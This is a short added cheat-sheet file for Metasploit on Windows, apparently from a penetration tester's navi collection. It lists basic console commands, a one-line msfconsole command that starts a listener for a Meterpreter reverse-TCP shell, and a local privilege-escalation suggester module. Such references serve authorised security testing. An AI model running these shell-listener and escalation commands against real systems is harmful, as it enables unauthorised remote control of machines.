@@ -1,0 +1,20 @@
+% windows, msfconsole, metasploit
+; From https://github.com/sealldeveloper/navi-cheats/
+
+# [INSIDE METASPLOIT] List required options
+options
+
+# [INSIDE METASPLOIT] Set value for a variables
+set <var>
+
+# [INSIDE METASPLOIT] Set a global value for all instances of that variables
+setg <var>
+
+# [INSIDE METASPLOIT] Search everything
+search <search>
+
+# Setup Windows meterpreter shell listener
+msfconsole -x "use exploit/multi/handler;set LHOST <listener-ip>;set LPORT <listener-port>;set payload windows/meterpreter/reverse_tcp;run"
+
+# [INSIDE METASPLOIT] Meterpreter Shell - LPE
+run post/multi/recon/local_exploit_suggester
